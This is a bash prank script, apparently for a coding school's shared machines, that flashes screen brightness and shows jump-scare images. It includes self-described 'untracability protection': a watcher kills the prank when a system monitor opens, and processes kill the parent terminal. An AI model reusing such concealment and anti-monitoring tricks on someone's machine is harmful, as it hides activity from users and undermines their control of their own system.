#!/bin/bash

set () { xrandr --output eDP --brightness $1; }
setg () { xrandr --output eDP --gamma $1:$1:$1; }

# This makes sure to reset brightness when terminal is closed
quit () { set 1; }
trap quit EXIT

# Full untracability protection
function _scriptalivedetector ()
{
	while true; do
		if ! ps -p $SCRPID > /dev/null; then
			kill -9 $1 > /dev/null
			kill -9 $2 > /dev/null
			exit 0
		fi
		sleep 0.2
	done
}
function _sysmondetector ()
{
	while true; do
		if [[ ! $(ps aux | grep -v "grep" | grep "gnome-system-monitor") == "" ]]; then
			kill $1 > /dev/null
			exit 0
		fi
		sleep 0.2
	done
}
if [[ ! $1 == "nozsh" ]]; then
	$0 nozsh &
	SCRPID=$!
	history -p
	clear
	_scriptalivedetector $PPID $$ &
	zsh
	kill -9 $PPID > /dev/null
	exit 0
fi
_sysmondetector $$ &

# Util function
deci () {
    local n=$1 len=$2 whole=$1
    if (( len >= ${#n} )); then
        echo $(deci $n $((len - 1)))
    else
		whole=${n:0:len}
		if [ -z "${whole}" ]; then
			whole=0
		fi
        echo "${whole}.${n:len}"
    fi
}

function boom ()
{
	START=200
	# set $(deci $START 5 2)
	while (( START > 10 )); do
		set $(deci $START 2)
		sleep 0.05
		if (( START > 100 )); then
			START=$(( START - 3 ))
		else
			START=$(( START - 1 ))
		fi
	done
	set 1
}

clear
feh -F -Z /sgoinfre/thinkfast.jpg &
sleep 2
feh -F -Z /sgoinfre/moulinette_face_reveal.png &
sleep 0.5
boom
while true; do sleep 1; done